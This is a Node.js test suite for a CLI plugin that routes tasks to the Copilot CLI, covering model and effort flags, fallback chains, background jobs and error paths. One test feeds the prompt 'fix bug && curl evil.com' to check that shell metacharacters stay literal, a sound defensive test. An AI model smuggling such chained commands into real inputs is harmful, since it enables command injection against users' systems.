import fs from "node:fs";
import path from "node:path";
import process from "node:process";
import test from "node:test";
import assert from "node:assert/strict";

import { makeTempDir, run } from "./helpers.mjs";
import { buildCopilotEnv, COMPANION_SCRIPT, REPO_ROOT } from "./harness.mjs";

function buildScriptedPrompt(text, opts = {}) {
  return {
    sessionId: opts.sessionId ?? "sess-task-1",
    prompt: {
      updates: [
        {
          sessionUpdate: "agent_message_chunk",
          content: { type: "text", text }
        }
      ],
      stopReason: opts.stopReason ?? "end_turn"
    }
  };
}

function runCompanion(args, envOpts) {
  return run(process.execPath, [COMPANION_SCRIPT, ...args], {
    cwd: envOpts.cwd ?? REPO_ROOT,
    env: buildCopilotEnv(envOpts.envOpts ?? envOpts)
  });
}

test("task surfaces the scripted assistant message", () => {
  const pluginData = makeTempDir();
  const result = runCompanion(
    ["task", "hello"],
    { pluginData, script: buildScriptedPrompt("Task handled.") }
  );
  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
  assert.match(result.stdout, /Task handled\./);
});

test("task without a prompt and without --resume-last fails fast", () => {
  const pluginData = makeTempDir();
  const result = runCompanion(
    ["task"],
    { pluginData, script: buildScriptedPrompt("should not run") }
  );
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /Provide a prompt, a prompt file, piped stdin, or use --resume-last/);
});

test("task rejects --resume and --fresh together", () => {
  const pluginData = makeTempDir();
  const result = runCompanion(
    ["task", "--resume", "--fresh", "work"],
    { pluginData, script: buildScriptedPrompt("never") }
  );
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /Choose either --resume\/--resume-last or --fresh/);
});

test("task --background enqueues a tracked job and persists a queued record", () => {
  const pluginData = makeTempDir();
  const result = runCompanion(
    ["task", "--background", "work on it"],
    { pluginData, script: buildScriptedPrompt("async output") }
  );
  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
  assert.match(result.stdout, /started in the background as task-/);
  assert.match(result.stdout, /Check \/copilot:status/);

  const stateRoot = path.join(pluginData, "state");
  const workspaceEntry = fs.readdirSync(stateRoot)[0];
  const jobsDir = path.join(stateRoot, workspaceEntry, "jobs");
  const jobFile = fs.readdirSync(jobsDir).find((name) => name.endsWith(".json"));
  assert.ok(jobFile, `expected a job record under ${jobsDir}`);
  const job = JSON.parse(fs.readFileSync(path.join(jobsDir, jobFile), "utf8"));
  // Parent process exits synchronously after writing the queued record; the
  // detached worker may still be transitioning when we read. Accept either
  // the initial "queued" state or any later terminal state.
  assert.ok(
    ["queued", "running", "completed", "failed"].includes(job.status),
    `unexpected job.status=${job.status}`
  );
  assert.equal(job.jobClass, "task");
});

test("task with both --model and --effort emits a stderr notice that --effort was ignored", () => {
  // Both the stderr notice (emitted by the companion CLI layer) and the
  // subsequent --model routing (now handled by the per-call CLI fallback)
  // are under test. Earlier versions of this test deferred the spawn-arg
  // assertion until the broker learned to honor per-call models; v0.3 ships
  // the per-call CLI fallback instead (see runCopilotCli in lib/copilot.mjs),
  // so the per-call --model assertion lives in the dedicated tests below.
  const pluginData = makeTempDir();
  const result = runCompanion(
    ["task", "--model", "haiku", "--effort", "high", "work"],
    { pluginData, script: buildScriptedPrompt("done") }
  );
  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
  assert.match(result.stderr, /--effort high is ignored because --model claude-haiku-4.5 was also passed/);
});

function readSpawnLog(spawnLogPath) {
  if (!fs.existsSync(spawnLogPath)) return [];
  return fs
    .readFileSync(spawnLogPath, "utf8")
    .split("\n")
    .filter(Boolean)
    .map((line) => JSON.parse(line));
}

test("task --model haiku bypasses the broker and passes --model claude-haiku-4.5 via -p", () => {
  const pluginData = makeTempDir();
  const spawnLog = path.join(makeTempDir(), "spawn.jsonl");
  const result = runCompanion(
    ["task", "--model", "haiku", "hi"],
    {
      pluginData,
      script: buildScriptedPrompt("CLI output."),
      spawnLog
    }
  );
  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
  assert.match(result.stdout, /CLI output\./);
  const entries = readSpawnLog(spawnLog);
  const cli = entries.find((entry) => entry.argv.includes("-p"));
  assert.ok(
    cli,
    `expected a -p invocation; argvs: ${JSON.stringify(entries.map((entry) => entry.argv))}`
  );
  const modelIdx = cli.argv.indexOf("--model");
  assert.ok(
    modelIdx >= 0 && cli.argv[modelIdx + 1] === "claude-haiku-4.5",
    `expected --model claude-haiku-4.5; got ${JSON.stringify(cli.argv)}`
  );
  assert.ok(
    !cli.argv.includes("--acp"),
    `per-call CLI path should not pass --acp; got ${JSON.stringify(cli.argv)}`
  );
  assert.ok(!entries.some((entry) => entry.argv.includes("--acp")));
});

test("task --effort low routes through the per-call CLI with --model claude-opus-4.6-fast", () => {
  const pluginData = makeTempDir();
  const spawnLog = path.join(makeTempDir(), "spawn.jsonl");
  const result = runCompanion(
    ["task", "--effort", "low", "hi"],
    {
      pluginData,
      script: buildScriptedPrompt("fast ok"),
      spawnLog
    }
  );
  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
  assert.match(result.stdout, /fast ok/);
  const entries = readSpawnLog(spawnLog);
  const cli = entries.find((entry) => entry.argv.includes("-p"));
  assert.ok(cli, `expected a -p invocation; argvs: ${JSON.stringify(entries.map((entry) => entry.argv))}`);
  const modelIdx = cli.argv.indexOf("--model");
  assert.ok(
    modelIdx >= 0 && cli.argv[modelIdx + 1] === "claude-opus-4.6-fast",
    `expected --model claude-opus-4.6-fast; got ${JSON.stringify(cli.argv)}`
  );
});

test("task --effort high routes through the per-call CLI with --model claude-opus-4.6", () => {
  const pluginData = makeTempDir();
  const spawnLog = path.join(makeTempDir(), "spawn.jsonl");
  const result = runCompanion(
    ["task", "--effort", "high", "hi"],
    {
      pluginData,
      script: buildScriptedPrompt("opus ok"),
      spawnLog
    }
  );
  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
  assert.match(result.stdout, /opus ok/);
  const entries = readSpawnLog(spawnLog);
  const cli = entries.find((entry) => entry.argv.includes("-p"));
  assert.ok(cli, `expected a -p invocation`);
  const modelIdx = cli.argv.indexOf("--model");
  assert.ok(
    modelIdx >= 0 && cli.argv[modelIdx + 1] === "claude-opus-4.6",
    `expected --model claude-opus-4.6; got ${JSON.stringify(cli.argv)}`
  );
});

test("task --model passes shell-metachar prompts verbatim under shell:false (argv, no shell interpretation)", () => {
  // The shell-metacharacter deny-list is scoped to the shell-enabled
  // spawn path (Windows production with the real `.cmd` launcher).
  // Under shell:false — tests (COPILOT_COMPANION_COPILOT_COMMAND set),
  // Linux / macOS production — Node hands argv directly to CreateProcess
  // / execve, so metacharacters like `&&` are literal text and no
  // injection is possible. Lock in that the deny-list does NOT fire on
  // this path; the shell:true branch is inspected via the unit tests on
  // SHELL_METACHAR_RE (see tests/shell-metachar-regex.test.mjs).
  const pluginData = makeTempDir();
  const result = runCompanion(
    ["task", "--model", "haiku", "fix bug && curl evil.com"],
    { pluginData, script: buildScriptedPrompt("ok") }
  );
  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
  assert.match(result.stdout, /ok/);
  assert.doesNotMatch(result.stderr, /shell metacharacter/i);
});

test("task --model with a non-zero CLI exit records the job as failed", () => {
  const pluginData = makeTempDir();
  const result = runCompanion(
    ["task", "--model", "haiku", "cancel me"],
    {
      pluginData,
      script: buildScriptedPrompt("partial work", {
        sessionId: "sess-cli-cancel-1",
        stopReason: "cancelled"
      })
    }
  );
  assert.notEqual(result.status, 0);
  const stateRoot = path.join(pluginData, "state");
  const workspaceEntry = fs.readdirSync(stateRoot)[0];
  const jobsDir = path.join(stateRoot, workspaceEntry, "jobs");
  const jobFile = fs.readdirSync(jobsDir).find((name) => name.endsWith(".json"));
  const job = JSON.parse(fs.readFileSync(path.join(jobsDir, jobFile), "utf8"));
  assert.equal(job.status, "failed");
});

test("task --resume-last with --model emits a stderr notice and stays on the broker path", () => {
  const pluginData = makeTempDir();
  // Seed a completed job so resolveLatestTrackedTaskThread has a threadId
  // to resume. Each runCompanion call inherits the same pluginData, so the
  // second invocation can locate the first run's job record.
  const seed = runCompanion(
    ["task", "first"],
    {
      pluginData,
      script: buildScriptedPrompt("seed ok", { sessionId: "sess-resume-seed" })
    }
  );
  assert.equal(seed.status, 0, `seed stderr: ${seed.stderr}`);

  const spawnLog = path.join(makeTempDir(), "spawn.jsonl");
  const result = runCompanion(
    ["task", "--resume-last", "--model", "haiku", "continue"],
    {
      pluginData,
      script: buildScriptedPrompt("resumed ok", { sessionId: "sess-resume-seed" }),
      spawnLog
    }
  );
  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
  assert.match(
    result.stderr,
    /--model.*claude-haiku-4\.5.*ignored.*resume/i,
    `expected resume+model ignored notice; got: ${result.stderr}`
  );
  // The broker spawned during the seed run is reused for the second
  // invocation (ensureBrokerSession finds it via broker.json inside the
  // shared pluginData), so the second companion may not spawn a fresh
  // fake-copilot at all. The key contract under test is that the per-call
  // CLI (-p) path is NOT taken when resuming — an empty or acp-only spawn
  // log both satisfy that assertion.
  const entries = readSpawnLog(spawnLog);
  assert.ok(
    !entries.some((entry) => entry.argv.includes("-p")),
    `resume+model must not use the -p CLI path; argvs: ${JSON.stringify(entries.map((e) => e.argv))}`
  );
});

test("task --effort high falls back to --model claude-sonnet-4.5 when claude-opus-4.6 is unavailable", () => {
  const pluginData = makeTempDir();
  const spawnLog = path.join(makeTempDir(), "spawn.jsonl");
  const result = runCompanion(
    ["task", "--effort", "high", "hi"],
    {
      pluginData,
      script: {
        ...buildScriptedPrompt("fallback ok"),
        unavailableModels: ["claude-opus-4.6"]
      },
      spawnLog
    }
  );
  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
  assert.match(result.stdout, /fallback ok/);
  assert.match(
    result.stderr,
    /claude-opus-4\.6.*unavailable.*retrying.*claude-sonnet-4\.5.*fallback chain/i,
    `expected fallback notice on stderr; got: ${result.stderr}`
  );
  const entries = readSpawnLog(spawnLog);
  const cliEntries = entries.filter((entry) => entry.argv.includes("-p"));
  assert.equal(
    cliEntries.length,
    2,
    `expected exactly two -p invocations; got ${cliEntries.length}: ${JSON.stringify(cliEntries.map((e) => e.argv))}`
  );
  const firstModel = cliEntries[0].argv[cliEntries[0].argv.indexOf("--model") + 1];
  const secondModel = cliEntries[1].argv[cliEntries[1].argv.indexOf("--model") + 1];
  assert.equal(firstModel, "claude-opus-4.6");
  assert.equal(secondModel, "claude-sonnet-4.5");
});

test("task --effort high exhausts the fallback chain when every tier is unavailable", () => {
  const pluginData = makeTempDir();
  const spawnLog = path.join(makeTempDir(), "spawn.jsonl");
  const result = runCompanion(
    ["task", "--effort", "high", "hi"],
    {
      pluginData,
      script: {
        ...buildScriptedPrompt("never seen"),
        unavailableModels: [
          "claude-opus-4.6",
          "claude-sonnet-4.5",
          "claude-opus-4.6-fast"
        ]
      },
      spawnLog
    }
  );
  assert.notEqual(result.status, 0);
  // Two retry notices, then the final unavailable error from the
  // tail-of-chain spawn surfaces in the rendered failure path.
  const noticeMatches = result.stderr.match(/appears unavailable on this account/g) ?? [];
  assert.equal(
    noticeMatches.length,
    2,
    `expected two retry notices (high → sonnet → fast); got ${noticeMatches.length}`
  );
  const entries = readSpawnLog(spawnLog);
  const cliEntries = entries.filter((entry) => entry.argv.includes("-p"));
  assert.equal(cliEntries.length, 3, "expected three -p invocations across the full chain");
});

test("task --effort high with explicit --model opus does NOT auto-fallback", () => {
  const pluginData = makeTempDir();
  const spawnLog = path.join(makeTempDir(), "spawn.jsonl");
  const result = runCompanion(
    ["task", "--effort", "high", "--model", "opus", "hi"],
    {
      pluginData,
      script: {
        ...buildScriptedPrompt("never seen"),
        unavailableModels: ["claude-opus-4.6"]
      },
      spawnLog
    }
  );
  // --model wins over --effort (the existing stderr notice still fires);
  // because the user picked opus explicitly, no fallback happens.
  assert.notEqual(result.status, 0);
  assert.doesNotMatch(
    result.stderr,
    /appears unavailable on this account.*retrying/i,
    `explicit --model must not trigger fallback; stderr was: ${result.stderr}`
  );
  const entries = readSpawnLog(spawnLog);
  const cliEntries = entries.filter((entry) => entry.argv.includes("-p"));
  assert.equal(cliEntries.length, 1, "explicit --model should produce exactly one spawn attempt");
});

test("task --effort high with the primary model available does not retry", () => {
  const pluginData = makeTempDir();
  const spawnLog = path.join(makeTempDir(), "spawn.jsonl");
  const result = runCompanion(
    ["task", "--effort", "high", "hi"],
    {
      pluginData,
      script: buildScriptedPrompt("primary ok"),
      spawnLog
    }
  );
  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
  assert.match(result.stdout, /primary ok/);
  const entries = readSpawnLog(spawnLog);
  const cliEntries = entries.filter((entry) => entry.argv.includes("-p"));
  assert.equal(cliEntries.length, 1, "no fallback expected when the primary model succeeds");
});

test("task --effort high non-availability failure does NOT trigger fallback", () => {
  const pluginData = makeTempDir();
  const spawnLog = path.join(makeTempDir(), "spawn.jsonl");
  const result = runCompanion(
    ["task", "--effort", "high", "hi"],
    {
      pluginData,
      // stopReason != "end_turn" makes fake-copilot exit 1 without writing
      // a model-availability stderr — the kind of failure we should NOT
      // retry on.
      script: buildScriptedPrompt("partial", {
        sessionId: "sess-non-avail-fail",
        stopReason: "cancelled"
      }),
      spawnLog
    }
  );
  assert.notEqual(result.status, 0);
  assert.doesNotMatch(
    result.stderr,
    /appears unavailable on this account.*retrying/i
  );
  const entries = readSpawnLog(spawnLog);
  const cliEntries = entries.filter((entry) => entry.argv.includes("-p"));
  assert.equal(cliEntries.length, 1, "non-availability failures must not trigger the fallback chain");
});

test("task --resume-last --effort high collapses the fallback chain on the broker path (single attempt)", () => {
  const pluginData = makeTempDir();
  // Seed a prior job so --resume-last has a threadId to resume. Broker
  // path ignores per-call --model, so retrying down the chain would
  // fire redundant identical calls + misleading retry notices naming
  // models that were never actually used.
  const seed = runCompanion(
    ["task", "first"],
    {
      pluginData,
      script: buildScriptedPrompt("seed ok", { sessionId: "sess-resume-collapse" })
    }
  );
  assert.equal(seed.status, 0, `seed stderr: ${seed.stderr}`);

  const spawnLog = path.join(makeTempDir(), "spawn.jsonl");
  const result = runCompanion(
    ["task", "--resume-last", "--effort", "high", "continue"],
    {
      pluginData,
      script: buildScriptedPrompt("resumed ok", { sessionId: "sess-resume-collapse" }),
      spawnLog
    }
  );
  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
  assert.doesNotMatch(
    result.stderr,
    /appears unavailable on this account.*retrying/i,
    `resume+effort must not emit fallback retry notices; stderr was: ${result.stderr}`
  );
  const entries = readSpawnLog(spawnLog);
  const cliEntries = entries.filter((entry) => entry.argv.includes("-p"));
  assert.equal(
    cliEntries.length,
    0,
    `resume+effort must stay on the broker path; -p argv was: ${JSON.stringify(cliEntries.map((e) => e.argv))}`
  );
});

test("task --background --effort high falls back to --model claude-sonnet-4.5 via the worker path", () => {
  const pluginData = makeTempDir();
  const result = runCompanion(
    ["task", "--background", "--effort", "high", "bg work"],
    {
      pluginData,
      script: {
        ...buildScriptedPrompt("bg fallback ok"),
        unavailableModels: ["claude-opus-4.6"]
      }
    }
  );
  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
  assert.match(result.stdout, /started in the background/);

  // Walk state to find the completed job; worker's fallback chain must
  // fire the same way as foreground.
  const stateRoot = path.join(pluginData, "state");
  const workspaceEntry = fs.readdirSync(stateRoot)[0];
  const jobsDir = path.join(stateRoot, workspaceEntry, "jobs");

  // Poll until the detached worker writes terminal state (worker runs
  // async; this integration test accepts either completed or the
  // completed-with-fallback outcome). The worker's writeJobFile is a
  // plain writeFileSync, so a poll that hits the file mid-write reads
  // truncated content — tolerate partial reads by retrying rather than
  // throwing "Unexpected end of JSON input" and failing the test on
  // Windows where filesystem timing makes the race more frequent.
  const deadline = Date.now() + 90000;
  let job;
  while (Date.now() < deadline) {
    const jobFile = fs.readdirSync(jobsDir).find((name) => name.endsWith(".json"));
    if (jobFile) {
      try {
        job = JSON.parse(fs.readFileSync(path.join(jobsDir, jobFile), "utf8"));
        if (job.status === "completed" || job.status === "failed") break;
      } catch {
        // Partial write; retry next poll.
      }
    }
    // Busy-wait sparingly to keep this test bounded.
    const start = Date.now();
    while (Date.now() - start < 500) {
      /* spin */
    }
  }
  assert.ok(job, "expected a worker job record");
  assert.equal(
    job.status,
    "completed",
    `worker must succeed via fallback; got ${job.status} with log ${JSON.stringify(job)}`
  );
});

test("task --model with a missing Copilot binary surfaces a non-zero exit and error", () => {
  // Points COPILOT_COMPANION_COPILOT_COMMAND at a path that doesn't exist.
  // This exercises the user-visible failure path: the availability probe in
  // ensureCopilotAvailable rejects with a "not installed" message before
  // runCopilotCli is ever reached. It's the same failure surface users get
  // in production when the Copilot CLI isn't on PATH, so the assertion
  // targets the rendered error rather than runCopilotCli's proc.on("error").
  const pluginData = makeTempDir();
  const result = runCompanion(
    ["task", "--model", "haiku", "hi"],
    {
      pluginData,
      script: buildScriptedPrompt("never"),
      extraEnv: {
        COPILOT_COMPANION_COPILOT_COMMAND: JSON.stringify([
          path.join(makeTempDir(), "definitely-not-a-real-copilot-binary")
        ])
      }
    }
  );
  assert.notEqual(result.status, 0);
  assert.match(
    result.stdout + result.stderr,
    /not installed|ACP is unavailable|ENOENT|not found/i,
    `expected a recognizable availability error; got: stdout=${result.stdout} stderr=${result.stderr}`
  );
});

test("task without --model stays on the shared broker path (--acp, no --model)", () => {
  const pluginData = makeTempDir();
  const spawnLog = path.join(makeTempDir(), "spawn.jsonl");
  const result = runCompanion(
    ["task", "hi"],
    {
      pluginData,
      script: buildScriptedPrompt("broker ok"),
      spawnLog
    }
  );
  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
  const entries = readSpawnLog(spawnLog);
  const acp = entries.find((entry) => entry.argv.includes("--acp"));
  assert.ok(
    acp,
    `expected an --acp broker spawn; argvs: ${JSON.stringify(entries.map((entry) => entry.argv))}`
  );
  assert.ok(!acp.argv.includes("-p"));
  assert.ok(!acp.argv.includes("--model"));
});

test("task surfaces a session/prompt error from Copilot", () => {
  const pluginData = makeTempDir();
  const result = runCompanion(
    ["task", "fail me"],
    {
      pluginData,
      script: {
        sessionId: "sess-err-1",
        prompt: { error: { code: -32099, message: "ACP exploded" } }
      }
    }
  );
  assert.notEqual(result.status, 0);
  assert.match(result.stdout + result.stderr, /ACP exploded/);
});

test("task persists a job record with copilotSessionId after completion", () => {
  const pluginData = makeTempDir();
  const result = runCompanion(
    ["task", "hi"],
    {
      pluginData,
      script: buildScriptedPrompt("ok", { sessionId: "sess-persist-1" })
    }
  );
  assert.equal(result.status, 0, `stderr: ${result.stderr}`);

  // Walk the plugin-data state tree to find the single job file.
  const stateRoot = path.join(pluginData, "state");
  const workspaceEntry = fs.readdirSync(stateRoot)[0];
  const jobsDir = path.join(stateRoot, workspaceEntry, "jobs");
  const jobFile = fs
    .readdirSync(jobsDir)
    .find((name) => name.endsWith(".json"));
  assert.ok(jobFile, `expected a job file under ${jobsDir}`);
  const job = JSON.parse(fs.readFileSync(path.join(jobsDir, jobFile), "utf8"));
  assert.equal(job.status, "completed");
  assert.equal(job.threadId, "sess-persist-1");
  assert.equal(job.result?.copilotSessionId, "sess-persist-1");
});

test("task with stopReason=cancelled exits non-zero and records the turn status", () => {
  const pluginData = makeTempDir();
  const result = runCompanion(
    ["task", "cancel me"],
    {
      pluginData,
      script: buildScriptedPrompt("partial work", {
        sessionId: "sess-cancel-task",
        stopReason: "cancelled"
      })
    }
  );
  assert.notEqual(result.status, 0);
  const stateRoot = path.join(pluginData, "state");
  const workspaceEntry = fs.readdirSync(stateRoot)[0];
  const jobsDir = path.join(stateRoot, workspaceEntry, "jobs");
  const jobFile = fs.readdirSync(jobsDir).find((n) => n.endsWith(".json"));
  const job = JSON.parse(fs.readFileSync(path.join(jobsDir, jobFile), "utf8"));
  assert.equal(job.status, "failed");
});

test("task with stopReason=refusal exits non-zero", () => {
  const pluginData = makeTempDir();
  const result = runCompanion(
    ["task", "refuse this"],
    {
      pluginData,
      script: buildScriptedPrompt("", {
        sessionId: "sess-refusal-task",
        stopReason: "refusal"
      })
    }
  );
  assert.notEqual(result.status, 0);
});

test("task with empty updates array completes cleanly", () => {
  const pluginData = makeTempDir();
  const result = runCompanion(
    ["task", "silent completion"],
    {
      pluginData,
      script: {
        sessionId: "sess-silent-1",
        prompt: { updates: [], stopReason: "end_turn" }
      }
    }
  );
  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
});

test("task with piped stdin prompt runs and surfaces output", () => {
  const pluginData = makeTempDir();
  const result = run(
    process.execPath,
    [COMPANION_SCRIPT, "task"],
    {
      cwd: REPO_ROOT,
      env: buildCopilotEnv({ pluginData, script: buildScriptedPrompt("stdin ok") }),
      input: "review this prompt from stdin\n"
    }
  );
  assert.equal(result.status, 0, `stderr: ${result.stderr}`);
  assert.match(result.stdout, /stdin ok/);
});
